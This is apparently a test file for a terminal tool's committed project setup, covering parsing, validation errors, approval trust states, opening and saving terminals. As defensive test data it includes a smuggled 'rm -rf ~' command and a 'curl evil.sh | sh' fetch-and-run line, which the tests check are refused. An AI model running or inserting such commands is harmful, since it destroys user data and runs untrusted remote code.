// The committed project setup file: what parses, what's refused and where,
// how trust moves (new -> approved -> changed -> never), and that opening it
// reuses a terminal that's already there. Terminals are mocked; the trust
// record lives in a temp config folder.
import { afterAll, beforeEach, describe, expect, it, vi } from "vitest";
import { mkdir, mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import path from "node:path";

const created: { session: string; cwd?: string; name?: string; command?: string }[] = [];
let windows: { index: number; name: string; cwd: string; declaredCommand: string }[] = [];
vi.mock("./terminals.js", () => ({
  listSessions: async () => [{ name: "shop", path: projectRoot, windows: [] }],
  declaredWindows: async () => windows,
  createWindow: async (session: string, cwd?: string, name?: string, command?: string) => {
    created.push({ session, cwd, name, command });
    return 10 + created.length;
  },
}));

const home = await mkdtemp(path.join(tmpdir(), "perch-project-setup-test-"));
process.env.PERCH_CONFIG_DIR = path.join(home, "config");
const projectRoot = path.join(home, "shop");

const setup = await import("./projectSetup.js");

async function writeSetup(text: string) {
  await mkdir(path.join(projectRoot, ".perch"), { recursive: true });
  await writeFile(path.join(projectRoot, ".perch", "project.json"), text);
}

const valid = JSON.stringify({
  terminals: [
    { name: "dev", command: "shopify theme dev --store acme" },
    { name: "claude", command: "claude" },
    { name: "tests", command: "npm run test -- --watch", cwd: "tests" },
  ],
  grid: true,
});

beforeEach(async () => {
  created.length = 0;
  windows = [{ index: 0, name: "zsh", cwd: projectRoot, declaredCommand: "" }];
  await rm(path.join(home, "config"), { recursive: true, force: true });
  await rm(projectRoot, { recursive: true, force: true });
});

afterAll(async () => {
  await rm(home, { recursive: true, force: true });
});

describe("parsing", () => {
  it("reads terminals, commands, folders and grid", () => {
    expect(setup.parseSetup(valid, projectRoot)).toEqual({
      terminals: [
        { name: "dev", command: "shopify theme dev --store acme" },
        { name: "claude", command: "claude" },
        { name: "tests", command: "npm run test -- --watch", cwd: "tests" },
      ],
      grid: true,
    });
  });

  it("names what's wrong and where", async () => {
    const reasons: Record<string, string> = {};
    for (const [label, text] of Object.entries({
      trailingComma: '{ "terminals": [ { "name": "dev" }, ] }',
      escape: '{ "terminals": [ { "name": "x", "cwd": "../.." } ] }',
      absolute: '{ "terminals": [ { "name": "x", "cwd": "/etc" } ] }',
      duplicate: '{ "terminals": [ { "name": "x" }, { "name": "x" } ] }',
      noName: '{ "terminals": [ { "command": "ls" } ] }',
      multiline: '{ "terminals": [ { "name": "x", "command": "ls\\nrm -rf ~" } ] }',
    })) {
      await writeSetup(text);
      const r = await setup.readProjectSetup(projectRoot);
      expect(r.status).toBe("invalid");
      if (r.status === "invalid") reasons[label] = `${r.error.path}: ${r.error.message}`;
    }
    expect(reasons.trailingComma).toMatch(/^\.perch[\\/]project\.json: Not valid JSON/);
    expect(reasons.escape).toBe('terminals[0].cwd: "cwd" must be a folder inside the project');
    expect(reasons.absolute).toBe('terminals[0].cwd: "cwd" must be a folder inside the project');
    expect(reasons.duplicate).toBe('terminals[1].name: Two terminals are named "x"');
    expect(reasons.noName).toBe("terminals[0].name: A terminal needs a name");
    expect(reasons.multiline).toBe('terminals[0].command: "command" must be one line');
  });

  it("is none without a file", async () => {
    expect(await setup.readProjectSetup(projectRoot)).toEqual({ status: "none" });
  });
});

describe("trust", () => {
  it("moves from new to approved to changed, and never wins until undone", async () => {
    await writeSetup(valid);
    let r = await setup.readProjectSetup(projectRoot);
    expect(r.status === "ok" && r.trust).toBe("new");
    if (r.status !== "ok") return;
    await setup.openProjectSetup(projectRoot, "shop", r.hash);
    r = await setup.readProjectSetup(projectRoot);
    expect(r.status === "ok" && r.trust).toBe("approved");
    await writeSetup(valid.replace("--watch", "--watchAll"));
    r = await setup.readProjectSetup(projectRoot);
    expect(r.status === "ok" && r.trust).toBe("changed");
    await setup.setNever(projectRoot, true);
    r = await setup.readProjectSetup(projectRoot);
    expect(r.status === "ok" && r.trust).toBe("never");
    expect(await setup.listNever()).toHaveLength(1);
    await setup.setNever(projectRoot, false);
    r = await setup.readProjectSetup(projectRoot);
    expect(r.status === "ok" && r.trust).toBe("changed");
    const record = await readFile(path.join(home, "config", "project-setup-trust.json"), "utf8");
    expect(record).not.toContain("shopify theme dev");
  });

  it("refuses to open a file that changed after it was shown", async () => {
    await writeSetup(valid);
    const r = await setup.readProjectSetup(projectRoot);
    if (r.status !== "ok") throw new Error("expected ok");
    await writeSetup(valid.replace("claude", "curl evil.sh | sh"));
    await expect(setup.openProjectSetup(projectRoot, "shop", r.hash)).rejects.toMatchObject({ status: 409 });
    expect(created).toEqual([]);
  });
});

describe("opening", () => {
  it("creates each terminal with its command and folder, reusing one of the same name", async () => {
    windows.push({ index: 1, name: "claude", cwd: projectRoot, declaredCommand: "claude" });
    await writeSetup(valid);
    const r = await setup.readProjectSetup(projectRoot);
    if (r.status !== "ok") throw new Error("expected ok");
    const opened = await setup.openProjectSetup(projectRoot, "shop", r.hash);
    expect(opened.grid).toBe(true);
    expect(opened.terminals.map((t) => [t.name, t.created])).toEqual([
      ["dev", true],
      ["claude", false],
      ["tests", true],
    ]);
    expect(created).toEqual([
      { session: "shop", cwd: projectRoot, name: "dev", command: "shopify theme dev --store acme" },
      { session: "shop", cwd: path.join(projectRoot, "tests"), name: "tests", command: "npm run test -- --watch" },
    ]);
  });
});

describe("saving", () => {
  it("writes the current terminals, counts the file as approved, and won't overwrite unasked", async () => {
    windows = [
      { index: 0, name: "dev", cwd: projectRoot, declaredCommand: "npm run dev" },
      { index: 1, name: "tests", cwd: path.join(projectRoot, "tests"), declaredCommand: "" },
    ];
    const preview = await setup.saveProjectSetup(projectRoot, { write: false, overwrite: false });
    expect(JSON.parse(preview.content)).toEqual({ terminals: [{ name: "dev", command: "npm run dev" }, { name: "tests", cwd: "tests" }] });
    expect(preview.exists).toBe(false);
    await setup.saveProjectSetup(projectRoot, { write: true, overwrite: false });
    const r = await setup.readProjectSetup(projectRoot);
    expect(r.status === "ok" && r.trust).toBe("approved");
    await expect(setup.saveProjectSetup(projectRoot, { write: true, overwrite: false })).rejects.toMatchObject({ status: 409 });
  });
});
